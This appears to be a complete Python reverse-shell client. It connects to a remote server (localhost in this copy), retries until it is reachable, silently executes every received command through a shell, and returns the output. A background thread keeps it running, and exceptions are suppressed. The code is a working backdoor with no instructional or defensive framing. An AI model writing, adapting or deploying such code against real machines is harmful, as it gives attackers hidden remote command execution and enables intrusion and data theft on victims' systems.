import socket
import subprocess
import threading
import time
import sys

def tcp_client():
    host = "127.0.0.1"
    port = 12345

    # Retry until server is available
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, port))
            break
        except Exception:
            time.sleep(5)  # wait and retry

    while True:
        try:
            rec = s.recv(1024)
            if not rec:
                break  # server disconnected

            cmd = rec.decode().strip()
            if not cmd:
                continue

            # Run command silently
            result = subprocess.run(cmd, capture_output=True, text=True, shell=True)
            out = result.stdout.strip() if result.stdout else result.stderr.strip()
            s.sendall(out.encode())

        except Exception:
            try:
                s.sendall(b"Error")
            except:
                break  # stop if sending fails

def main():
    # Run client in a background thread
    client_thread = threading.Thread(target=tcp_client, daemon=True)
    client_thread.start()

    # Keep main thread alive so script doesn't exit
    while True:
        time.sleep(60)

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        # Prevent the script from crashing silently
        pass
